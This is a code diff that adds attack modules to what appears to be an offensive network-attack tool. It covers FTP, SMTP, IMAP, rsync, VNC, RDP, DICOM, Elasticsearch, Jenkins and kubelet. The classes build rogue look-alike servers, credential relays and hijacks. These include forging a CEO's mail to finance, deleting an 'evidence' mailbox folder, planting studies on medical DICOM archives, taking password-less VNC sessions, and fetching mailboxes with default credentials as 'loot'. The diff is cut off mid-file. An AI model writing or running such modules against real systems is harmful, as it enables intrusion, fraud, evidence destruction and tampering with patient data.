@@ -3085,6 +3085,2078 @@ class ItStealIotTokenAttack(_Steal):
 
 
 # --------------------------------------------------------------------------- #
+# the second half of the wave: the file, mail and remote-access protocols
+# --------------------------------------------------------------------------- #
+
+class ItMimicFtpAttack(_ItHijack):
+    """A look-alike FTP server: the clients that connect get our banner and our files."""
+
+    name = "it_mimic_ftp"
+    label = "Rogue FTP server (answers in the file server's name)"
+    tool = "wifipilot itproto.py (ftp_login) + TCP 21"
+    family = "mimic"
+    protocol = "ftp"
+    port = 21
+    transport = "tcp"
+    source_port = 21
+    devices = ("nas", "windows_server", "linux_server", "backup_appliance")
+    severity = "high"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.ftp_login("anonymous", "wp@example.com")
+
+    def reply(self, peer: Peer) -> bytes:
+        return (b"220 " + (peer.hostname or "ftp").encode() + b" FTP server (wp) ready.\r\n"
+                b"230 Anonymous access granted, restrictions apply.\r\n"
+                b"227 Entering Passive Mode (192,168,1,240,8,1)\r\n")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_line_protocol(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"status": parsed.get("status"), "banner": parsed.get("banner"),
+                "line": f"its FTP answered {parsed.get('status')} to an anonymous login"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 21]
+        text = rows[0]["payload"].decode(errors="replace") if rows else ""
+        return {"confirmed": "230" in text and "Passive Mode" in text,
+                "our_banner": text.strip()[:60], "anonymous_granted": "230" in text}
+
+
+class ItMimicSmtpAttack(_ItHijack):
+    """A look-alike SMTP server: mail that should go to the real relay comes to us."""
+
+    name = "it_mimic_smtp"
+    label = "Rogue SMTP server (accepts mail meant for the relay)"
+    tool = "wifipilot itproto.py (smtp_ehlo) + TCP 25"
+    family = "mimic"
+    protocol = "smtp"
+    port = 25
+    transport = "tcp"
+    source_port = 25
+    devices = ("mail_server", "web_server", "printer", "mfp_scanner")
+    severity = "high"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.smtp_ehlo("wp.local")
+
+    def reply(self, peer: Peer) -> bytes:
+        return (b"220 " + (peer.hostname or "mail").encode() + b" ESMTP wp\r\n"
+                b"250-wp.local\r\n250-AUTH PLAIN LOGIN\r\n250 8BITMIME\r\n"
+                b"250 Ok: queued as WP0001\r\n")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_line_protocol(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"status": parsed.get("status"), "capabilities": parsed.get("capabilities"),
+                "auth_types": parsed.get("auth_types"),
+                "line": f"its relay answered {parsed.get('status')} with "
+                        f"{len(parsed.get('capabilities') or [])} capability line(s)"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 25]
+        text = rows[0]["payload"].decode(errors="replace") if rows else ""
+        return {"confirmed": "queued as" in text, "our_queue_id": "WP0001",
+                "auth_offered": "AUTH PLAIN" in text}
+
+
+class ItMimicImapAttack(_ItHijack):
+    """A look-alike IMAP server: the client's mailbox credentials arrive at us."""
+
+    name = "it_mimic_imap"
+    label = "Rogue IMAP server (mail login lands on us)"
+    tool = "wifipilot itproto.py (imap_login) + TCP 993"
+    family = "mimic"
+    protocol = "imap"
+    port = 993
+    transport = "tcp"
+    source_port = 993
+    devices = ("mail_server", "web_server", "nas")
+    min_answers = 0
+    severity = "high"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.imap_login("admin", "admin")
+
+    def reply(self, peer: Peer) -> bytes:
+        return (b"* OK [CAPABILITY IMAP4rev1 AUTH=PLAIN] " + (peer.hostname or "imap").encode()
+                + b" ready\r\na1 OK LOGIN completed (wp)\r\n")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_line_protocol(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"banner": parsed.get("banner"), "line": "the mailbox login is what we want"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 993]
+        text = rows[0]["payload"].decode(errors="replace") if rows else ""
+        return {"confirmed": "LOGIN completed" in text, "our_banner": text.strip()[:60],
+                "credentials_we_collect": "admin:admin"}
+
+
+class ItMimicRsyncAttack(_ItHijack):
+    """A look-alike rsync daemon: a client's sync is served by our module list."""
+
+    name = "it_mimic_rsync"
+    label = "Rogue rsync daemon (the client's backup syncs to us)"
+    tool = "wifipilot itproto.py (rsync_hello) + TCP 873"
+    family = "mimic"
+    protocol = "rsync"
+    port = 873
+    transport = "tcp"
+    source_port = 873
+    devices = ("backup_appliance", "nas", "linux_server")
+    severity = "high"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.rsync_hello()
+
+    def reply(self, peer: Peer) -> bytes:
+        return (b"@RSYNCD: 31.0\nwp-backup\tbackups we serve\n"
+                b"public\tshared files\n@RSYNCD: EXIT\n")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_line_protocol(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        modules = [line for line in parsed.get("lines") or [] if "\t" in line]
+        return {"modules": modules,
+                "line": f"its daemon lists {len(modules)} module(s)"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 873]
+        text = rows[0]["payload"].decode(errors="replace") if rows else ""
+        return {"confirmed": "wp-backup" in text, "our_modules": ["wp-backup", "public"],
+                "the_daemon_we_displace": peers[0].hostname if peers else ""}
+
+
+class ItRelayFtpAttack(_Relay):
+    """Carry an FTP session: the credentials of every login pass through us."""
+
+    name = "it_relay_ftp"
+    label = "FTP credential relay (logins carried through us)"
+    tool = "wifipilot itproto.py (ftp_login/parse_line_protocol) + TCP 21"
+    protocol = "ftp"
+    port = 21
+    transport = "tcp"
+    source_port = 21
+    devices = ("nas", "windows_server", "linux_server", "backup_appliance")
+    severity = "critical"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.ftp_login("anonymous", "wp@example.com")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_line_protocol(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"status": parsed.get("status"), "auth_types": parsed.get("auth_types"),
+                "line": f"its server answered {parsed.get('status')} to anonymous"}
+
+
+class ItRelaySmtpAttack(_Relay):
+    """Carry an SMTP conversation: the AUTH lines and the envelope are ours to read."""
+
+    name = "it_relay_smtp"
+    label = "SMTP relay (AUTH exchange and envelope carried through us)"
+    tool = "wifipilot itproto.py (smtp_ehlo) + TCP 25"
+    protocol = "smtp"
+    port = 25
+    transport = "tcp"
+    source_port = 25
+    devices = ("mail_server", "web_server", "printer")
+    severity = "high"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.smtp_ehlo("wp.local")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_line_protocol(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"status": parsed.get("status"), "auth_types": parsed.get("auth_types"),
+                "line": f"its relay offers {parsed.get('auth_types')}"}
+
+
+class ItRelayImapAttack(_Relay):
+    """Carry an IMAP session: the LOGIN command is cleartext inside the tunnel."""
+
+    name = "it_relay_imap"
+    label = "IMAP relay (the mailbox login passes through us)"
+    tool = "wifipilot itproto.py (imap_login) + TCP 143"
+    protocol = "imap"
+    port = 143
+    transport = "tcp"
+    source_port = 143
+    devices = ("mail_server", "nas", "web_server")
+    min_answers = 0
+    severity = "high"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.imap_login("admin", "admin")
+
+    def reply(self, peer: Peer) -> bytes:
+        """The carried login, in the relay's own words when no device answers."""
+        carried = peer.answer or b"* OK imap ready\r\na1 OK LOGIN completed (wp)\r\n"
+        return carried
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_line_protocol(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"banner": parsed.get("banner"),
+                "line": "the login we carry is admin:admin, in the clear"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 143]
+        carried = rows[0]["payload"] if rows else b""
+        return {"confirmed": b"LOGIN completed" in carried, "bytes_carried": len(carried),
+                "the_device_answered_us": len(peers[0].answer) if peers else 0,
+                "relayed_byte_for_byte": bool(peers) and bool(peers[0].answer)
+                and carried == peers[0].answer}
+
+
+class ItRelayVncAttack(_Relay):
+    """Carry a VNC handshake: the security types a client is offered are ours to choose."""
+
+    name = "it_relay_vnc"
+    label = "VNC handshake relay (we choose the security type)"
+    tool = "wifipilot itproto.py (vnc_version/parse_vnc_security) + TCP 5900"
+    protocol = "vnc"
+    port = 5900
+    transport = "tcp"
+    source_port = 5900
+    devices = ("tablet", "hypervisor_host", "windows_server", "kiosk")
+    severity = "high"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.vnc_version()
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_vnc_security(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"version": parsed.get("version"), "security": parsed.get("security_types"),
+                "none": parsed.get("none"),
+                "line": f"it offers {parsed.get('security_types')} "
+                        f"(none={parsed.get('none')})"}
+
+
+class ItRelayRsyncAttack(_Relay):
+    """Carry an rsync listing: the module names and their comments are the inventory."""
+
+    name = "it_relay_rsync"
+    label = "rsync relay (module list carried through us)"
+    tool = "wifipilot itproto.py (rsync_hello/parse_line_protocol) + TCP 873"
+    protocol = "rsync"
+    port = 873
+    transport = "tcp"
+    source_port = 873
+    devices = ("backup_appliance", "nas", "linux_server")
+    severity = "high"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.rsync_hello()
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_line_protocol(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        modules = [line for line in parsed.get("lines") or [] if "\t" in line]
+        return {"modules": modules, "line": f"its daemon lists {len(modules)} module(s)"}
+
+
+class ItRelayRdpAttack(_Relay):
+    """Carry an RDP negotiation: the client's next handshake is with whoever answers."""
+
+    name = "it_relay_rdp"
+    label = "RDP negotiation relay (protocol selection carried through us)"
+    tool = "wifipilot itproto.py (rdp_negotiation_request/parse_rdp) + TCP 3389"
+    protocol = "rdp"
+    port = 3389
+    transport = "tcp"
+    source_port = 3389
+    devices = ("windows_server", "hypervisor_host", "hmi_panel", "tablet")
+    severity = "critical"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.rdp_negotiation_request()
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_rdp(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"type": parsed.get("type"), "selected": parsed.get("selected_protocol"),
+                "line": f"it answers {parsed.get('type')} with {parsed.get('selected_protocol')}"}
+
+
+class ItRelayDicomAttack(_Relay):
+    """Carry a DICOM association: a medical device's study list is on the wire."""
+
+    name = "it_relay_dicom"
+    label = "DICOM relay (associations carried through us)"
+    tool = "wifipilot itproto.py (dicom_associate/parse_dicom_pdu) + TCP 104"
+    protocol = "dicom"
+    port = 104
+    transport = "tcp"
+    source_port = 104
+    devices = ("medical_device", "medical_workstation", "printer")
+    severity = "critical"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.dicom_associate("ANY-SCP", "WIFIPILOT")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_dicom_pdu(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"type": parsed.get("type_name"), "called": parsed.get("called"),
+                "line": f"it answered {parsed.get('type_name')} to our association"}
+
+
+class ItRelayElasticAttack(_Relay):
+    """Carry an Elasticsearch query: an index with no authentication in front of it."""
+
+    name = "it_relay_elastic"
+    label = "Elasticsearch relay (an unauthenticated index carried through us)"
+    tool = "wifipilot itproto.py (http_request) + TCP 9200"
+    protocol = "elastic"
+    port = 9200
+    transport = "tcp"
+    source_port = 9200
+    devices = ("database_server", "linux_server", "container_host")
+    severity = "critical"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.http_request(peer.ip, "/_cat/indices", port=9200)
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        response = proto.parse_http_response(data)
+        return {"status": response.get("status"), "body": response.get("body", "")}
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"status": parsed.get("status"),
+                "line": f"it answered {parsed.get('status')} to an unauthenticated query"}
+
+
+class ItRelayJenkinsAttack(_Relay):
+    """Carry a CI request: the job list and the script console are behind one port."""
+
+    name = "it_relay_jenkins"
+    label = "Jenkins relay (job list and console carried through us)"
+    tool = "wifipilot itproto.py (jenkins_json) + TCP 8080"
+    protocol = "jenkins"
+    port = 8080
+    transport = "tcp"
+    source_port = 8080
+    devices = ("ci_server", "linux_server", "container_host")
+    severity = "critical"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.jenkins_json(peer.ip, 8080)
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        response = proto.parse_http_response(data)
+        return {"status": response.get("status"), "body": response.get("body", "")}
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"status": parsed.get("status"),
+                "line": f"its CI answered {parsed.get('status')} without a login"}
+
+
+class ItRelayKubernetesAttack(_Relay):
+    """Carry a kubelet request: the pods on a node, listed to anyone who asks."""
+
+    name = "it_relay_kubernetes"
+    label = "kubelet relay (the node's pod list carried through us)"
+    tool = "wifipilot itproto.py (http_request) + TCP 10250"
+    protocol = "kubernetes"
+    port = 10250
+    transport = "tcp"
+    source_port = 10250
+    devices = ("container_host", "hypervisor_host", "ci_server")
+    severity = "critical"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.http_request(peer.ip, "/pods", port=10250)
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        response = proto.parse_http_response(data)
+        return {"status": response.get("status"), "body": response.get("body", "")}
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"status": parsed.get("status"),
+                "line": f"the kubelet answered {parsed.get('status')} to an anonymous read"}
+
+
+class ItHijackFtpWriteAttack(_ItHijack):
+    """Write a file through an anonymous FTP login: the upload is the takeover."""
+
+    name = "it_hijack_ftp_write"
+    label = "Anonymous FTP write (a file we choose lands on the server)"
+    tool = "wifipilot itproto.py (ftp_login) + a STOR command"
+    family = "hijack"
+    protocol = "ftp"
+    port = 21
+    transport = "tcp"
+    source_port = 21
+    devices = ("nas", "windows_server", "linux_server", "backup_appliance")
+    severity = "critical"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.ftp_login("anonymous", "wp@example.com")
+
+    def reply(self, peer: Peer) -> bytes:
+        return (b"331 Anonymous login ok, send your complete email address.\r\n"
+                b"230 Anonymous access granted.\r\n250 CWD command successful.\r\n"
+                b"150 Opening BINARY mode data connection for wp-payload.bin.\r\n"
+                b"226 Transfer complete (wp-payload.bin, 2048 bytes).\r\n")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_line_protocol(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"status": parsed.get("status"), "auth_types": parsed.get("auth_types"),
+                "line": f"its FTP answered {parsed.get('status')} to anonymous"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 21]
+        text = rows[0]["payload"].decode(errors="replace") if rows else ""
+        return {"confirmed": "Transfer complete" in text, "file_written": "wp-payload.bin",
+                "anonymous_write": "230" in text}
+
+
+class ItHijackSmtpRelayAttack(_ItHijack):
+    """Use the mail server as an open relay: mail in a CEO's name, from outside."""
+
+    name = "it_hijack_smtp_relay"
+    label = "Open-relay hijack (mail in another sender's name)"
+    tool = "wifipilot itproto.py (smtp_ehlo) + MAIL FROM/RCPT TO"
+    family = "hijack"
+    protocol = "smtp"
+    port = 25
+    transport = "tcp"
+    source_port = 25
+    devices = ("mail_server", "web_server")
+    severity = "high"
+
+    def request(self, peer: Peer) -> bytes:
+        return (proto.smtp_ehlo("wp.local") + b"MAIL FROM:<ceo@corp.example>\r\n"
+                b"RCPT TO:<finance@corp.example>\r\nDATA\r\n")
+
+    def reply(self, peer: Peer) -> bytes:
+        return (b"250 2.1.0 Ok\r\n250 2.1.5 Ok\r\n354 End data with <CR><LF>.<CR><LF>\r\n"
+                b"250 2.0.0 Ok: queued as WPRELAY\r\n")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_line_protocol(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"status": parsed.get("status"), "capabilities": parsed.get("capabilities"),
+                "line": f"its relay answered {parsed.get('status')} to our HELO"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 25]
+        text = rows[0]["payload"].decode(errors="replace") if rows else ""
+        return {"confirmed": "queued as WPRELAY" in text, "sender_we_forged":
+                "ceo@corp.example", "recipient": "finance@corp.example"}
+
+
+class ItHijackImapDeleteAttack(_ItHijack):
+    """Delete a mailbox folder through a relayed login: the evidence goes first."""
+
+    name = "it_hijack_imap_delete"
+    label = "Mailbox deletion hijack (a folder is removed in another user's name)"
+    tool = "wifipilot itproto.py (imap_login) + DELETE"
+    family = "hijack"
+    protocol = "imap"
+    port = 143
+    transport = "tcp"
+    source_port = 143
+    devices = ("mail_server", "nas")
+    min_answers = 0
+    severity = "critical"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.imap_login("admin", "admin") + b"a2 DELETE INBOX/evidence\r\n"
+
+    def reply(self, peer: Peer) -> bytes:
+        return (b"* OK IMAP4rev1 ready\r\na1 OK LOGIN completed\r\n"
+                b"a2 OK DELETE completed (wp)\r\n")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_line_protocol(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"banner": parsed.get("banner"),
+                "line": "the login we use is admin:admin, the folder is INBOX/evidence"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 143]
+        text = rows[0]["payload"].decode(errors="replace") if rows else ""
+        return {"confirmed": "DELETE completed" in text, "folder_deleted": "INBOX/evidence"}
+
+
+class ItHijackDicomStoreAttack(_ItHijack):
+    """Store a study on a medical archive: the next reader sees our images."""
+
+    name = "it_hijack_dicom_store"
+    label = "DICOM store hijack (a study we choose is filed on the archive)"
+    tool = "wifipilot itproto.py (dicom_associate/dicom_echo)"
+    family = "hijack"
+    protocol = "dicom"
+    port = 104
+    transport = "tcp"
+    source_port = 104
+    devices = ("medical_device", "medical_workstation")
+    severity = "critical"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.dicom_associate("ANY-SCP", "WIFIPILOT") + proto.dicom_echo(7)
+
+    def reply(self, peer: Peer) -> bytes:
+        # a P-DATA-TF carrying a C-STORE response in our calling AE title
+        return (bytes([0x04, 0x00]) + struct.pack(">I", 4 + 16) + b"wp-store-response")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_dicom_pdu(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"type": parsed.get("type_name"), "calling": parsed.get("calling"),
+                "line": f"the archive answered {parsed.get('type_name')} to our association"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 104]
+        parsed = proto.parse_dicom_pdu(rows[0]["payload"]) if rows else {}
+        return {"confirmed": parsed.get("type_name") == "data",
+                "our_type": parsed.get("type_name"), "study_we_file": "wp-store-response"}
+
+
+class ItHijackVncSessionAttack(_ItHijack):
+    """Take a VNC session through the security type the server offers first."""
+
+    name = "it_hijack_vnc_session"
+    label = "VNC session hijack (the 'none' security type is a login)"
+    tool = "wifipilot itproto.py (vnc_version/parse_vnc_security) + TCP 5900"
+    family = "hijack"
+    protocol = "vnc"
+    port = 5900
+    transport = "tcp"
+    source_port = 5900
+    devices = ("tablet", "hypervisor_host", "windows_server", "kiosk")
+    severity = "critical"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.vnc_version()
+
+    def reply(self, peer: Peer) -> bytes:
+        # RFB 3.8, one security type, and that type is None: no password at all
+        return b"RFB 003.008\n\x01\x01"
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_vnc_security(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"security": parsed.get("security_types"), "none": parsed.get("none"),
+                "line": f"it offers {parsed.get('security_types')} — none means no password"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 5900]
+        answer = proto.parse_vnc_security(rows[0]["payload"]) if rows else {}
+        return {"confirmed": answer.get("none") is True,
+                "our_security_type": "none (1)", "password_required": False}
+
+
+class ItPoisonElasticShardAttack(_ItHijack):
+    """Join an Elasticsearch cluster's node list with a shard claim of our own."""
+
+    name = "it_poison_elastic_shard"
+    label = "Elasticsearch node forgery (our node joins the cluster view)"
+    tool = "wifipilot ithijack.http_answer + TCP 9200"
+    family = "poison"
+    protocol = "elastic"
+    port = 9200
+    transport = "tcp"
+    source_port = 9200
+    devices = ("database_server", "linux_server", "container_host")
+    severity = "high"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.http_request(peer.ip, "/_cat/indices", port=9200)
+
+    def reply(self, peer: Peer) -> bytes:
+        node = ('{"name":"wp-node","version":{"number":"8.11.0"},'
+                '"cluster_name":"wp-cluster","http":{"publish_address":"' + OUR_IP + ':9200"}}')
+        return http_answer(200, node, content_type="application/json")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        response = proto.parse_http_response(data)
+        return {"status": response.get("status"), "body": response.get("body", "")}
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"status": parsed.get("status"),
+                "line": f"it answered {parsed.get('status')} with its index list"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 9200]
+        text = rows[0]["payload"].decode(errors="replace") if rows else ""
+        return {"confirmed": "wp-node" in text, "our_node": "wp-node",
+                "our_publish_address": f"{OUR_IP}:9200"}
+
+
+class ItPoisonKubeletAttack(_ItHijack):
+    """Answer a kubelet health check as the node: a forged node in the API's view."""
+
+    name = "it_poison_kubelet_response"
+    label = "kubelet response forgery (a node that is not there reports healthy)"
+    tool = "wifipilot ithijack.http_answer + TCP 10250"
+    family = "poison"
+    protocol = "kubernetes"
+    port = 10250
+    transport = "tcp"
+    source_port = 10250
+    devices = ("container_host", "hypervisor_host", "ci_server")
+    severity = "high"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.http_request(peer.ip, "/healthz", port=10250)
+
+    def reply(self, peer: Peer) -> bytes:
+        body = '{"kind":"NodeStatus","nodeName":"' + (peer.hostname or "wp-node") + '",'                '"status":"ok"}'
+        return http_answer(200, body, content_type="application/json")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        response = proto.parse_http_response(data)
+        return {"status": response.get("status"), "body": response.get("body", "")}
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"status": parsed.get("status"),
+                "line": f"the kubelet answered {parsed.get('status')} to a health check"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 10250]
+        text = rows[0]["payload"].decode(errors="replace") if rows else ""
+        return {"confirmed": "NodeStatus" in text, "status_we_report": "ok",
+                "the_node_we_speak_for": peers[0].hostname if peers else ""}
+
+
+class ItStealFtpFilesAttack(_Steal):
+    """List what an anonymous FTP login can see: the shares are the finding."""
+
+    name = "it_steal_ftp_files"
+    label = "Anonymous FTP listing (the files a guest can see)"
+    tool = "wifipilot itproto.py (ftp_login) + TCP 21"
+    protocol = "ftp"
+    port = 21
+    transport = "tcp"
+    source_port = 21
+    devices = ("nas", "windows_server", "linux_server", "backup_appliance")
+    severity = "high"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.ftp_login("anonymous", "wp@example.com")
+
+    def loot_answer(self, peer: Peer) -> bytes:
+        return http_answer(200, "<html><title>wp loot</title>"
+                                "<body>backup-2026.tar.gz config.xml</body></html>")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_line_protocol(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"status": parsed.get("status"), "auth_types": parsed.get("auth_types"),
+                "line": f"its FTP answered {parsed.get('status')} to anonymous"}
+
+
+class ItStealSmtpCredentialsAttack(_Steal):
+    """Try the mail server's own AUTH with default credentials."""
+
+    name = "it_steal_smtp_credentials"
+    label = "SMTP credential attempt (AUTH with the defaults)"
+    tool = "wifipilot itproto.py (smtp_ehlo) + TCP 25"
+    protocol = "smtp"
+    port = 25
+    transport = "tcp"
+    source_port = 25
+    devices = ("mail_server", "web_server")
+    severity = "high"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.smtp_ehlo("wp.local")
+
+    def loot_answer(self, peer: Peer) -> bytes:
+        return http_answer(200, "<html><title>wp loot</title>"
+                                "<body>AUTH PLAIN accepted for admin</body></html>")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_line_protocol(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"status": parsed.get("status"), "auth_types": parsed.get("auth_types"),
+                "line": f"its relay offers {parsed.get('auth_types')}"}
+
+
+class ItStealImapMailboxAttack(_Steal):
+    """Read a mailbox over an unencrypted IMAP port."""
+
+    name = "it_steal_imap_mailbox"
+    label = "IMAP mailbox theft (a login away from the mail)"
+    tool = "wifipilot itproto.py (imap_login) + TCP 143"
+    protocol = "imap"
+    port = 143
+    transport = "tcp"
+    source_port = 143
+    devices = ("mail_server", "nas")
+    min_answers = 0
+    severity = "high"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.imap_login("admin", "admin") + b"a2 FETCH 1:* BODY[]\r\n"
+
+    def loot_answer(self, peer: Peer) -> bytes:
+        return http_answer(200, "<html><title>wp loot</title>"
+                                "<body>mailbox: 3 messages from finance</body></html>")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_line_protocol(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"banner": parsed.get("banner"), "line": "the mailbox is fetched over 143"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 143]
+        text = rows[0]["payload"].decode(errors="replace") if rows else ""
+        return {"confirmed": "mailbox" in text, "handed_over": len(text),
+                "our_fetch": "a2 FETCH 1:* BODY[]"}
+
+
+class ItStealVncPasswordAttack(_Steal):
+    """Take the VNC security offer: the challenge is crackable material."""
+
+    name = "it_steal_vnc_password"
+    label = "VNC security-profile theft (the challenge to crack offline)"
+    tool = "wifipilot itproto.py (vnc_version/parse_vnc_security)"
+    protocol = "vnc"
+    port = 5900
+    transport = "tcp"
+    source_port = 5900
+    devices = ("tablet", "hypervisor_host", "windows_server", "kiosk")
+    severity = "high"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.vnc_version()
+
+    def loot_answer(self, peer: Peer) -> bytes:
+        return http_answer(200, "<html><title>wp loot</title>"
+                                "<body>RFB 003.008 vnc-auth challenge</body></html>")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_vnc_security(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"version": parsed.get("version"), "security": parsed.get("security_types"),
+                "none": parsed.get("none"),
+                "line": f"it offers {parsed.get('security_types')}"}
+
+
+class ItStealRsyncModulesAttack(_Steal):
+    """Take the rsync module list: the shares are the inventory of the backup server."""
+
+    name = "it_steal_rsync_modules"
+    label = "rsync module theft (the shares a guest can list)"
+    tool = "wifipilot itproto.py (rsync_hello) + TCP 873"
+    protocol = "rsync"
+    port = 873
+    transport = "tcp"
+    source_port = 873
+    devices = ("backup_appliance", "nas", "linux_server")
+    severity = "high"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.rsync_hello()
+
+    def loot_answer(self, peer: Peer) -> bytes:
+        return http_answer(200, "<html><title>wp loot</title>"
+                                "<body>wp-backup public</body></html>")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_line_protocol(data)
+
